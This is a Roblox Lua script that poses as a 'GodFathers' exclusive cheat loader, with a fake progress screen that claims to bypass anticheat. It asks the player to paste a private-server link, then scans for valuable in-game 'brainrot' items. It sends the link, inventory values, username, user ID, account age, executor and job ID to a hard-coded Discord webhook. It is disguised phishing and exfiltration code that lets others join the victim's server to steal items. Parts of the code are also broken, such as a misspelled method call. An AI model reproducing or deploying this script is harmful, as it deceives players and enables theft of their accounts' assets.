-- Services
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = game:GetService("Players").LocalPlayer
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

-- Detect Executor
local function getExecutorName()
    local success, result = pcall(function()
        if identifyexecutor then
            return identifyexecutor()
        elseif getexecutorname then
            return getexecutorname()
        elseif syn then
            return "Synapse X"
        elseif fluxus then
            return "Fluxus"
        elseif KRNL_LOADED then
            return "KRNL"
        elseif is_sirhurt_closure then
            return "SirHurt"
        elseif pebc_execute then
            return "Panda"
        elseif gethui then
            return "Script-Ware"
        else
            return "Unknown Executor"
        end
    end)
    return success and result or "Unknown"
end

-- Brainrot Configuration with EUR Values
local BRAINROT_VALUES = {
    -- Common
    ["Brainrot"] = 0.50,
    ["Basic Brainrot"] = 1.00,
    ["Small Brainrot"] = 2.50,
    
    -- Rare
    ["Rare Brainrot"] = 5.00,
    ["Golden Brainrot"] = 10.00,
    ["Crystal Brainrot"] = 15.00,
    
    -- Epic
    ["Epic Brainrot"] = 25.00,
    ["Diamond Brainrot"] = 50.00,
    ["Rainbow Brainrot"] = 75.00,
    
    -- Legendary
    ["Legendary Brainrot"] = 100.00,
    ["God Brainrot"] = 250.00,
    ["Titan Brainrot"] = 500.00,
    ["Omega Brainrot"] = 1000.00,
    
    -- Special Events
    ["Christmas Brainrot"] = 30.00,
    ["Halloween Brainrot"] = 35.00,
    ["Anniversary Brainrot"] = 100.00,
    
    -- KDML Specific
    ["KDML"] = 50.00,
    ["KDML Script"] = 75.00,
    ["KDML Brainrot"] = 100.00,
}

-- Floor Detection Configuration
-- Define floor heights (Y coordinates) for games with specific floor levels
-- Leave empty to use automatic raycast detection
local FLOOR_HEIGHTS = {
    -- Example: [0] = "Ground Floor", [50] = "Floor 2", [100] = "Floor 3"
    -- Add your game's specific floor Y-coordinates here
}

-- Packages
local NetPackages = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")

-- Notification listener
local notificationEvent = NetPackages:WaitForChild("RE/NotificationService/Notify", 5).OnClientEvent:Connect(function(title, message)
    -- Handle notifications here
end)

-- Toggle player settings
task.spawn(function()
    pcall(function()
        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Music")
        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Sound Effects")
        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Chat Tips")
        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("VFX")
    end)
end)

-- Disable CoreGui
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- ==========================================
-- GODFATHERS LOADER UI
-- ==========================================
local loaderGui = Instance.new("ScreenGui")
loaderGui.Name = "GodFathersLoader"
loaderGui.IgnoreGuiInset = true
loaderGui.ResetOnSpawn = false
loaderGui.Parent = game:GetService("CoreGui")

local mainContainer = Instance.new("Frame", loaderGui)
mainContainer.Size = UDim2.new(1, 0, 1, 0)
mainContainer.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
mainContainer.BorderSizePixel = 0

-- Animated background gradient
local gradient = Instance.new("UIGradient", mainContainer)
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 0, 0)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 0, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 0, 0))
})
gradient.Rotation = 45

-- Animate gradient
task.spawn(function()
    while loaderGui.Parent do
        TweenService:Create(gradient, TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            Rotation = gradient.Rotation + 180
        }):Play()
        wait(3)
    end
end)

-- GodFathers Logo/Text
local godFathersLabel = Instance.new("TextLabel", mainContainer)
godFathersLabel.Size = UDim2.new(1, 0, 0, 80)
godFathersLabel.Position = UDim2.new(0, 0, 0.3, 0)
godFathersLabel.BackgroundTransparency = 1
godFathersLabel.Font = Enum.Font.GothamBlack
godFathersLabel.TextSize = 72
godFathersLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
godFathersLabel.Text = "GODFATHERS"
godFathersLabel.TextStrokeTransparency = 0.8
godFathersLabel.TextStrokeColor3 = Color3.fromRGB(139, 0, 0)

-- Subtitle
local subtitleLabel = Instance.new("TextLabel", mainContainer)
subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
subtitleLabel.Position = UDim2.new(0, 0, 0.42, 0)
subtitleLabel.BackgroundTransparency = 1
subtitleLabel.Font = Enum.Font.GothamBold
subtitleLabel.TextSize = 18
subtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
subtitleLabel.Text = "EXCLUSIVE SCRIPTS & TOOLS"

-- Progress bar background
local progressBg = Instance.new("Frame", mainContainer)
progressBg.Size = UDim2.new(0, 400, 0, 6)
progressBg.Position = UDim2.new(0.5, -200, 0.55, 0)
progressBg.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
progressBg.BorderSizePixel = 0

local progressCorner = Instance.new("UICorner", progressBg)
progressCorner.CornerRadius = UDim.new(0, 3)

-- Progress bar fill
local progressFill = Instance.new("Frame", progressBg)
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
progressFill.BorderSizePixel = 0

local fillCorner = Instance.new("UICorner", progressFill)
fillCorner.CornerRadius = UDim.new(0, 3)

-- Loading text
local loadingText = Instance.new("TextLabel", mainContainer)
loadingText.Size = UDim2.new(1, 0, 0, 25)
loadingText.Position = UDim2.new(0, 0, 0.58, 0)
loadingText.BackgroundTransparency = 1
loadingText.Font = Enum.Font.GothamBold
loadingText.TextSize = 16
loadingText.TextColor3 = Color3.fromRGB(220, 20, 60)
loadingText.Text = "INITIALIZING..."

-- Percentage
local percentLabel = Instance.new("TextLabel", mainContainer)
percentLabel.Size = UDim2.new(1, 0, 0, 40)
percentLabel.Position = UDim2.new(0, 0, 0.62, 0)
percentLabel.BackgroundTransparency = 1
percentLabel.Font = Enum.Font.GothamBlack
percentLabel.TextSize = 36
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.Text = "0%"

-- Status messages
local statusLabel = Instance.new("TextLabel", mainContainer)
statusLabel.Size = UDim2.new(1, 0, 0, 20)
statusLabel.Position = UDim2.new(0, 0, 0.68, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 14
statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
statusLabel.Text = "Connecting to secure servers..."

-- Footer
local footerLabel = Instance.new("TextLabel", mainContainer)
footerLabel.Size = UDim2.new(1, 0, 0, 20)
footerLabel.Position = UDim2.new(0, 0, 0.9, 0)
footerLabel.BackgroundTransparency = 1
footerLabel.Font = Enum.Font.Gotham
footerLabel.TextSize = 12
footerLabel.TextColor3 = Color3.fromRGB(100, 0, 0)
footerLabel.Text = "discord.gg/godfathers | v2.0.1"

-- Loading sequence
local loadingStages = {
    {percent = 15, text = "BYPASSING ANTICHEAT...", status = "Injecting stealth modules..."},
    {percent = 30, text = "LOADING ASSETS...", status = "Fetching game data..."},
    {percent = 45, text = "SCANNING BRAINROTS...", status = "Analyzing workspace models..."},
    {percent = 60, text = "CALCULATING VALUES...", status = "Converting to EUR..."},
    {percent = 75, text = "SECURE CONNECTION...", status = "Establishing webhook tunnel..."},
    {percent = 90, text = "FINALIZING...", status = "Cleaning up traces..."},
    {percent = 100, text = "COMPLETE", status = "Ready to execute"},
}

-- Sound effect
local loadSound = Instance.new("Sound", mainContainer)
loadSound.SoundId = "rbxassetid://9113083740"
loadSound.Volume = 0.5
loadSound:Play()

-- Run loader animation
for _, stage in ipairs(loadingStages) do
    wait(math.random(8, 15) / 10)
    
    TweenService:Create(progressFill, TweenInfo.new(0.3), {
        Size = UDim2.new(stage.percent / 100, 0, 1, 0)
    }):Play()
    
    loadingText.Text = stage.text
    percentLabel.Text = stage.percent .. "%"
    statusLabel.Text = stage.status
    
    if stage.percent == 100 then
        TweenService:Create(godFathersLabel, TweenInfo.new(0.2), {
            TextColor3 = Color3.fromRGB(255, 50, 50)
        }):Play()
        wait(0.2)
        TweenService:Create(godFathersLabel, TweenInfo.new(0.2), {
            TextColor3 = Color3.fromRGB(220, 20, 60)
        }):Play()
    end
end

wait(0.5)
loaderGui:Destroy()

-- ==========================================
-- MAIN UI (After Loader)
-- ==========================================
local brainrotUI = Instance.new("ScreenGui")
brainrotUI.Name = "GodFathersUI"
brainrotUI.ResetOnSpawn = false
brainrotUI.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Main Frame with red/black theme
local mainFrame = Instance.new("Frame", brainrotUI)
mainFrame.Size = UDim2.new(0, 450, 0, 220)
mainFrame.Position = UDim2.new(0.5, -225, 0.5, -110)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true

-- Frame gradient
local frameGradient = Instance.new("UIGradient", mainFrame)
frameGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 5, 5)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 0, 0))
})

-- Corner
local frameCorner = Instance.new("UICorner", mainFrame)
frameCorner.CornerRadius = UDim.new(0, 12)

-- Border
local border = Instance.new("UIStroke", mainFrame)
border.Color = Color3.fromRGB(139, 0, 0)
border.Thickness = 2

-- Header bar
local headerBar = Instance.new("Frame", mainFrame)
headerBar.Size = UDim2.new(1, 0, 0, 50)
headerBar.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
headerBar.BorderSizePixel = 0

local headerCorner = Instance.new("UICorner", headerBar)
headerCorner.CornerRadius = UDim.new(0, 12)

-- Fix header corner
local headerFix = Instance.new("Frame", headerBar)
headerFix.Size = UDim2.new(1, 0, 0.5, 0)
headerFix.Position = UDim2.new(0, 0, 0.5, 0)
headerFix.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
headerFix.BorderSizePixel = 0

-- GodFathers logo in header
local headerLogo = Instance.new("TextLabel", headerBar)
headerLogo.Size = UDim2.new(1, 0, 1, 0)
headerLogo.BackgroundTransparency = 1
headerLogo.Font = Enum.Font.GothamBlack
headerLogo.TextSize = 24
headerLogo.TextColor3 = Color3.fromRGB(255, 255, 255)
headerLogo.Text = "GODFATHERS"

-- Subtitle
local titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.Size = UDim2.new(1, 0, 0, 30)
titleLabel.Position = UDim2.new(0, 0, 0.28, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 16
titleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
titleLabel.Text = "Enter Private Server Link to Unlock"

-- TextBox
local serverLinkBox = Instance.new("TextBox", mainFrame)
serverLinkBox.Size = UDim2.new(0.9, 0, 0, 45)
serverLinkBox.Position = UDim2.new(0.05, 0, 0.48, 0)
serverLinkBox.PlaceholderText = "https://www.roblox.com/share?code=..."
serverLinkBox.Font = Enum.Font.Gotham
serverLinkBox.TextSize = 14
serverLinkBox.TextColor3 = Color3.fromRGB(255, 255, 255)
serverLinkBox.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
serverLinkBox.ClearTextOnFocus = false

local textBoxCorner = Instance.new("UICorner", serverLinkBox)
textBoxCorner.CornerRadius = UDim.new(0, 8)

local textBoxStroke = Instance.new("UIStroke", serverLinkBox)
textBoxStroke.Color = Color3.fromRGB(100, 0, 0)
textBoxStroke.Thickness = 1

-- Submit Button
local enterButton = Instance.new("TextButton", mainFrame)
enterButton.Size = UDim2.new(0.9, 0, 0, 45)
enterButton.Position = UDim2.new(0.05, 0, 0.75, 0)
enterButton.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
enterButton.Text = "ENTER"
enterButton.Font = Enum.Font.GothamBlack
enterButton.TextSize = 18
enterButton.TextColor3 = Color3.fromRGB(255, 255, 255)

local buttonCorner = Instance.new("UICorner", enterButton)
buttonCorner.CornerRadius = UDim.new(0, 8)

-- Button hover effects
enterButton.MouseEnter:Connect(function()
    TweenService:Create(enterButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(178, 34, 34)
    }):Play()
end)

enterButton.MouseLeave:Connect(function()
    TweenService:Create(enterButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(139, 0, 0)
    }):Play()
end)

-- ==========================================
-- FLOOR DETECTION FUNCTION
-- ==========================================
local function getCurrentFloor()
    local character = LocalPlayer.Character
    if not character then return "Unknown" end
    
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return "Unknown" end
    
    local currentPos = humanoidRootPart.Position
    
    -- Method 1: Check predefined floor heights
    if #FLOOR_HEIGHTS > 0 then
        local currentHeight = currentPos.Y
        local detectedFloor = "Ground Floor"
        local closestHeight = -math.huge
        
        for height, floorName in pairs(FLOOR_HEIGHTS) do
            if currentHeight >= height and height > closestHeight then
                closestHeight = height
                detectedFloor = floorName
            end
        end
        return detectedFloor
    end
    
    -- Method 2: Raycast down to detect floor name
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {character}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    
    local rayOrigin = currentPos
    local rayDirection = Vector3.new(0, -50, 0) -- Cast down 50 studs
    
    local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
    
    if raycastResult then
        local hitPart = raycastResult.Instance
        if hitPart then
            -- Check if the part or its parent has a floor-related name
            local partName = hitPart.Name:lower()
            local parentName = hitPart.Parent and hitPart.Parent.Name:lower() or ""
            
            -- Common floor naming patterns
            if partName:find("floor") or partName:find("level") or partName:find("stage") then
                -- Extract floor number if present
                local floorNum = partName:match("%d+") or parentName:match("%d+")
                if floorNum then
                    return "Floor " .. floorNum
                else
                    return hitPart.Name
                end
            elseif partName:find("ground") or partName:find("baseplate") or partName:find("terrain") then
                return "Ground Floor"
            else
                -- Return the part name as fallback
                return hitPart.Name
            end
        end
    end
    
    -- Method 3: Check Y height as fallback
    local height = currentPos.Y
    if height < 10 then
        return "Ground Floor"
    elseif height < 50 then
        return "Floor 2+"
    elseif height < 100 then
        return "Floor 3+"
    else
        return "High Elevation (" .. math.floor(height) .. "m)"
    end
end

-- ==========================================
-- WEBHOOK & BRAINROT LOGIC
-- ==========================================

-- Function to scan for brainrots and calculate values
local function scanBrainrots()
    local foundBrainrots = {}
    local totalValue = 0
    local totalCount = 0
    
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("Model") or obj:IsA("Tool") or obj:IsA("Part") then
            local name = obj.Name
            
            -- Check against our value table
            for brainrotName, value in pairs(BRAINROT_VALUES) do
                if name:lower():find(brainrotName:lower()) then
                    table.insert(foundBrainrots, {
                        name = name,
                        value = value,
                        type = brainrotName
                    })
                    totalValue = totalValue + value
                    totalCount = totalCount + 1
                    break
                end
            end
            
            -- Check for numeric values in name (e.g., "Brainrot x5")
            local multiplier = name:match("x(%d+)$") or name:match("(%d+)x")
            if multiplier then
                local mult = tonumber(multiplier)
                if mult and mult > 1 then
                    totalValue = totalValue + (foundBrainrots[#foundBrainrots].value * (mult - 1))
                    totalCount = totalCount + (mult - 1)
                end
            end
        end
    end
    
    return foundBrainrots, totalValue, totalCount
end

-- Button click handler
enterButton.MouseButton1Click:Connect(function()
    local serverLink = serverLinkBox.Text
    local isValidLink = serverLink:match("^https://www%.roblox%.com/share%?code=[%w%d]+&type=Server$") or serverLink == "admin123"
    
    -- Validation check
    if not isValidLink then
        enterButton.Text = "❌ INVALID LINK"
        enterButton.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
        
        TweenService:Create(enterButton, TweenInfo.new(0.3), {
            BackgroundColor3 = Color3.fromRGB(139, 0, 0)
        }):Play()
        
        wait(1.5)
        enterButton.Text = "ENTER"
        return
    end

    -- Success animation
    enterButton.Text = "✅ ACCESS GRANTED"
    enterButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    
    wait(0.8)
    
    -- Fade out UI
    TweenService:Create(mainFrame, TweenInfo.new(0.5), {
        Position = UDim2.new(0.5, -225, 1.5, 0)
    }):Play()
    
    wait(0.5)
    brainrotUI:Destroy()

    -- Gather data
    local executorName = getExecutorName()
    local accountAgeDays = LocalPlayer.AccountAge
    local foundBrainrots, totalValue, totalCount = scanBrainrots()
    local currentFloor = getCurrentFloor()
    
    -- Format brainrot list for webhook
    local brainrotList = ""
    if #foundBrainrots > 0 then
        for i, item in ipairs(foundBrainrots) do
            brainrotList = brainrotList .. string.format("%d. **%s** (%s) - €%.2f EUR\n", 
                i, item.name, item.type, item.value)
        end
    else
        brainrotList = "No brainrots detected in workspace"
    end
    
    -- Calculate total in EUR
    local totalEUR = string.format("€%.2f", totalValue)
    
    -- Prepare webhook data
    task.spawn(function()
        local webhookData = {
            username = "GodFathers Security",
            avatar_url = "https://i.imgur.com/6XK8YBn.png",
            embeds = {{
                title = "🔴 New Execution Detected",
                color = 0xDC143C, -- Crimson red
                timestamp = DateTime.now():ToIsoDate(),
                thumbnail = {
                    url = "https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. LocalPlayer.Name
                },
                fields = {
                    {
                        name = "👤 Player Information",
                        value = string.format("**Username:** %s\n**Account Age:** %d days\n**User ID:** %d", 
                            LocalPlayer.Name, accountAgeDays, LocalPlayer.UserId),
                        inline = false
                    },
                    {
                        name = "💻 Executor Details",
                        value = string.format("**Executor:** %s\n**Job ID:** %s", 
                            executorName, game.JobId),
                        inline = false
                    },
                    {
                        name = "📍 Location Data",
                        value = string.format("**Current Floor:** %s\n**Position:** %.1f, %.1f, %.1f", 
                            currentFloor, 
                            LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and 
                            LocalPlayer.Character.HumanoidRootPart.Position.X or 0,
                            LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and 
                            LocalPlayer.Character.HumanoidRootPart.Position.Y or 0,
                            LocalPlayer.Character and LocalPlayer.Character:FindForFirstChild("HumanoidRootPart") and 
                            LocalPlayer.Character.HumanoidRootPart.Position.Z or 0),
                        inline = false
                    },
                    {
                        name = "🎁 Brainrot Inventory",
                        value = string.format("**Total Items:** %d\n**Total Value:** %s EUR\n\n%s", 
                            totalCount, totalEUR, brainrotList),
                        inline = false
                    },
                    {
                        name = "🔗 Private Server",
                        value = string.format("[Click to Join](%s)", serverLink),
                        inline = false
                    }
                },
                footer = {
                    text = "GodFathers Scripts | " .. os.date("%Y-%m-%d %H:%M:%S")
                }
            }}
        }
        
        -- Send webhook with error handling
        local success, err = pcall(function()
            local response = request({
                Url = "https://discord.com/api/webhooks/1475151471631667378/MMcbj311BeXhS5kom8h8InyjHmygsQQR_6_qOxbQjKV7Pt2r1FszKsr0cxD1hdkz-oAa",
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(webhookData)
            })
            
            if response and response.StatusCode ~= 204 then
                warn("Webhook returned status: " .. tostring(response.StatusCode))
            end
        end)
        
        if not success then
            warn("Failed to send webhook: " .. tostring(err))
        end
    end)
    
    -- Re-enable CoreGui after execution
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
end)
